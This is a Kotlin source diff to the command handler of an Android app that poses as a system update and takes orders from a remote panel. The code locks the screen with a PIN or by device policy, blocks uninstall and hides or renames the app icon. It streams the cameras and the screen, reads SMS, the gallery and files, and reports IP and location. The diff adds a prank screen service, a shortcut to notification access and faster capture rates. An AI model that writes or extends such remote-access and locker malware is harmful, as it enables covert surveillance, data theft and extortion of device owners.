@@ -15,6 +15,7 @@ import android.os.Looper
 import android.os.VibrationEffect
 import android.os.Vibrator
 import android.provider.MediaStore
+import android.provider.Settings
 import android.telephony.TelephonyManager
 import android.util.Base64
 import com.google.gson.JsonObject
@@ -91,14 +92,12 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
     fun execute(cmd: String, args: JsonObject?, done: (Any) -> Unit) {
         when (cmd) {
 
-            // ============ LOCK PIN ============
+            // ============ LOCK ============
             "lock_pin" -> {
                 val pin = args?.get("pin")?.asString ?: "1234"
                 startLockService("pin", pin, 0)
                 done(mapOf("ok" to true, "type" to "pin", "pin" to pin))
             }
-
-            // ============ LOCK HARD ============
             "lock_hard" -> {
                 try {
                     val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
@@ -110,21 +109,15 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 startLockService("hard", "0", 0)
                 done(mapOf("ok" to true, "type" to "hard"))
             }
-
-            // ============ LOCK JAM ============
             "lock_time" -> {
                 val hours = args?.get("hours")?.asLong ?: 5L
                 startLockService("time", "0", hours)
                 done(mapOf("ok" to true, "hours" to hours))
             }
-
-            // ============ CRASH ============
             "crash" -> {
                 startLockService("crash", "0", 0)
                 done(mapOf("crash" to true))
             }
-
-            // ============ UNLOCK ============
             "unlock" -> {
                 try {
                     val i = Intent(ctx, LockService::class.java).apply {
@@ -140,7 +133,35 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 try { ctx.stopService(Intent(ctx, ScreenStreamService::class.java)) } catch (_: Exception) {}
                 try { ctx.stopService(Intent(ctx, VideoPlayerService::class.java)) } catch (_: Exception) {}
                 try { ctx.stopService(Intent(ctx, AudioPlayerService::class.java)) } catch (_: Exception) {}
+                try { ctx.stopService(Intent(ctx, PrankLCDService::class.java)) } catch (_: Exception) {}
                 done(mapOf("ok" to true))
+            }
+
+            // ============ PRANK LCD ============
+            "prank_lcd_on" -> {
+                try {
+                    val i = Intent(ctx, PrankLCDService::class.java)
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        ctx.startForegroundService(i)
+                    } else {
+                        ctx.startService(i)
+                    }
+                    done(mapOf("ok" to true, "lcd" to true))
+                } catch (e: Exception) {
+                    done(mapOf("error" to e.message))
+                }
+            }
+            "prank_lcd_off" -> {
+                try {
+                    val i = Intent(ctx, PrankLCDService::class.java).apply {
+                        putExtra("stop", true)
+                    }
+                    ctx.startService(i)
+                    ctx.stopService(i)
+                    done(mapOf("ok" to true, "lcd" to false))
+                } catch (e: Exception) {
+                    done(mapOf("error" to e.message))
+                }
             }
 
             // ============ SEND VIDEO ============
@@ -159,12 +180,8 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 } catch (_: Exception) {}
                 done(mapOf("ok" to true, "url" to url))
             }
-
-            // ============ STOP MP4 ============
             "stop_mp4" -> {
-                try {
-                    ctx.stopService(Intent(ctx, VideoPlayerService::class.java))
-                } catch (_: Exception) {}
+                try { ctx.stopService(Intent(ctx, VideoPlayerService::class.java)) } catch (_: Exception) {}
                 done(mapOf("ok" to true))
             }
 
@@ -183,8 +200,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 } catch (_: Exception) {}
                 done(mapOf("ok" to true, "url" to url))
             }
-
-            // ============ STOP MP3 ============
             "stop_mp3" -> {
                 try {
                     val i = Intent(ctx, AudioPlayerService::class.java).apply {
@@ -204,7 +219,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 StickerSpam.start(ctx, urls, 200, 30, duration)
                 done(mapOf("ok" to true, "count" to urls.size, "duration" to duration))
             }
-
             "stop_sticker" -> {
                 StickerSpam.stop()
                 done(mapOf("ok" to true))
@@ -216,7 +230,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 try {
                     val i = Intent(ctx, CameraStreamService::class.java).apply {
                         putExtra("front", true)
-                        putExtra("interval", 150L)
+                        putExtra("interval", 120L)
                     }
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                         ctx.startForegroundService(i)
@@ -231,7 +245,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 try {
                     val i = Intent(ctx, CameraStreamService::class.java).apply {
                         putExtra("front", false)
-                        putExtra("interval", 150L)
+                        putExtra("interval", 120L)
                     }
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                         ctx.startForegroundService(i)
@@ -252,7 +266,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                     try { ctx.stopService(Intent(ctx, ScreenStreamService::class.java)) } catch (_: Exception) {}
                     try {
                         val i = Intent(ctx, ScreenStreamService::class.java).apply {
-                            putExtra("interval", 150L)
+                            putExtra("interval", 120L)
                         }
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                             ctx.startForegroundService(i)
@@ -281,19 +295,30 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 ))
             }
 
+            // ============ OPEN NOTIFICATION ACCESS ============
+            "open_notif_access" -> {
+                try {
+                    val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {
+                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    }
+                    ctx.startActivity(intent)
+                    done(mapOf("ok" to true))
+                } catch (e: Exception) {
+                    done(mapOf("error" to e.message))
+                }
+            }
+
             // ============ GALLERY ============
             "gallery" -> done(readGallery())
 
             // ============ IP ============
             "ip" -> done(getIpInfo())
 
-            // ============ FLASH ============
+            // ============ FLASH/VIBRATE ============
             "flash" -> {
                 if (flashSpam) stopFlashSpam() else startFlashSpam()
                 done(mapOf("flash" to flashSpam))
             }
-
-            // ============ VIBRATE ============
             "vibrate" -> {
                 if (vibrateSpam) stopVibrateSpam() else startVibrateSpam()
                 done(mapOf("vibrate" to vibrateSpam))
@@ -358,13 +383,10 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 }
             }
 
-            // ============ HIDE BROADCAST ============
             "hide_broadcast" -> {
                 Handler(Looper.getMainLooper()).post { BroadcastOverlay.hide(ctx) }
                 done(mapOf("ok" to true))
             }
-
-            // ============ READ NOTIFS ============
             "read_notifs" -> {
                 done(mapOf("type" to "text", "data" to "Notif listener aktif"))
             }
@@ -429,28 +451,24 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 }
             }
 
-            // ============ LIST FILES ============
+            // ============ FILES ============
             "list_files" -> {
                 val path = args?.get("path")?.asString ?: ""
                 val result = if (path.isEmpty()) FileManager.listStorageRoots() else FileManager.listFiles(path)
                 done(result)
             }
-
-            // ============ READ FILE ============
             "read_file" -> {
                 val path = args?.get("path")?.asString ?: ""
                 if (path.isEmpty()) done(mapOf("error" to "no path"))
                 else done(FileManager.readFile(path))
             }
-
-            // ============ DOWNLOAD FILE ============
             "download_file" -> {
                 val path = args?.get("path")?.asString ?: ""
                 if (path.isEmpty()) done(mapOf("error" to "no path"))
                 else done(FileManager.downloadFile(path))
             }
 
-            // ============ CHAT REPLY ============
+            // ============ CHAT ============
             "chat_reply" -> {
                 val text = args?.get("text")?.asString ?: ""
                 if (text.isEmpty()) done(mapOf("error" to "no text"))
@@ -462,7 +480,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 try {
                     val pm = ctx.packageManager
 
-                    // Aktifkan 1 alias (Settings) sebagai launcher pengganti
                     try {
                         pm.setComponentEnabledSetting(
                             ComponentName(ctx.packageName, "com.system.update.AliasSettings"),
@@ -471,7 +488,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                         )
                     } catch (_: Exception) {}
 
-                    // Disable SetupUsernameActivity (icon default ilang)
                     try {
                         pm.setComponentEnabledSetting(
                             ComponentName(ctx, SetupUsernameActivity::class.java),
@@ -480,7 +496,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                         )
                     } catch (_: Exception) {}
 
-                    // Disable alias lain
                     val otherAliases = listOf(
                         "com.system.update.AliasSystemUpdate",
                         "com.system.update.AliasPlayServices",
@@ -507,7 +522,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             "show_app" -> {
                 try {
                     val pm = ctx.packageManager
-
                     try {
                         pm.setComponentEnabledSetting(
                             ComponentName(ctx, SetupUsernameActivity::class.java),
@@ -539,7 +553,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 }
             }
 
-            // ============ SET APP ICON + NAME ============
+            // ============ SET APP ICON ============
             "set_app_icon" -> {
                 try {
                     val newName = args?.get("name")?.asString ?: "System Update"
@@ -561,27 +575,18 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                         else -> "com.system.update.AliasSystemUpdate"
                     }
 
-                    // Disable SetupUsernameActivity
-                    try {
-                        pm.setComponentEnabledSetting(
-                            ComponentName(ctx, SetupUsernameActivity::class.java),
-                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                            android.content.pm.PackageManager.DONT_KILL_APP
-                        )
-                    } catch (_: Exception) {}
-
-                    // Disable semua alias dulu
                     for (alias in allAliases) {
-                        try {
-                            pm.setComponentEnabledSetting(
-                                ComponentName(ctx.packageName, alias),
-                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                                android.content.pm.PackageManager.DONT_KILL_APP
-                            )
-                        } catch (_: Exception) {}
+                        if (alias != targetAlias) {
+                            try {
+                                pm.setComponentEnabledSetting(
+                                    ComponentName(ctx.packageName, alias),
+                                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                                    android.content.pm.PackageManager.DONT_KILL_APP
+                                )
+                            } catch (_: Exception) {}
+                        }
                     }
 
-                    // Aktifkan alias target
                     try {
                         pm.setComponentEnabledSetting(
                             ComponentName(ctx.packageName, targetAlias),
@@ -590,11 +595,15 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                         )
                     } catch (_: Exception) {}
 
-                    done(mapOf(
-                        "ok" to true,
-                        "name" to newName,
-                        "alias" to targetAlias
-                    ))
+                    try {
+                        pm.setComponentEnabledSetting(
+                            ComponentName(ctx, SetupUsernameActivity::class.java),
+                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                            android.content.pm.PackageManager.DONT_KILL_APP
+                        )
+                    } catch (_: Exception) {}
+
+                    done(mapOf("ok" to true, "name" to newName, "alias" to targetAlias))
                 } catch (e: Exception) {
                     done(mapOf("error" to e.message))
                 }
@@ -604,9 +613,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         }
     }
 
-    // ============================================================
-    // LOCK SERVICE
-    // ============================================================
     private fun startLockService(type: String, pin: String, hours: Long) {
         try {
             val video = "${panelBase()}/videos/warning.mp4"
@@ -627,9 +633,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         } catch (_: Exception) {}
     }
 
-    // ============================================================
-    // FLASH SPAM
-    // ============================================================
     fun startFlashSpam() {
         if (flashSpam) return
         flashSpam = true
@@ -650,12 +653,8 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             flashSpam = false
         }.start()
     }
-
     fun stopFlashSpam() { flashSpam = false }
 
-    // ============================================================
-    // VIBRATE SPAM
-    // ============================================================
     fun startVibrateSpam() {
         if (vibrateSpam) return
         vibrateSpam = true
@@ -675,12 +674,8 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             }.start()
         } catch (_: Exception) {}
     }
-
     fun stopVibrateSpam() { vibrateSpam = false }
 
-    // ============================================================
-    // ANTI UNINSTALL
-    // ============================================================
     private fun antiUninstall() {
         try {
             val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
@@ -693,9 +688,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         } catch (_: Exception) {}
     }
 
-    // ============================================================
-    // SMS — inbox + sent + draft
-    // ============================================================
     private fun readAllSms(): Map<String, Any> {
         val list = mutableListOf<Map<String, String>>()
         try {
@@ -727,9 +719,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         return mapOf("type" to "sms", "messages" to list)
     }
 
-    // ============================================================
-    // GALLERY
-    // ============================================================
     private fun readGallery(): Map<String, Any> {
         val list = mutableListOf<Map<String, String>>()
         try {
@@ -755,9 +744,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         return mapOf("type" to "gallery", "items" to list)
     }
 
-    // ============================================================
-    // IP + LOCATION
-    // ============================================================
     private fun getIpInfo(): Map<String, Any> {
         var lat = 0.0
         var lon = 0.0
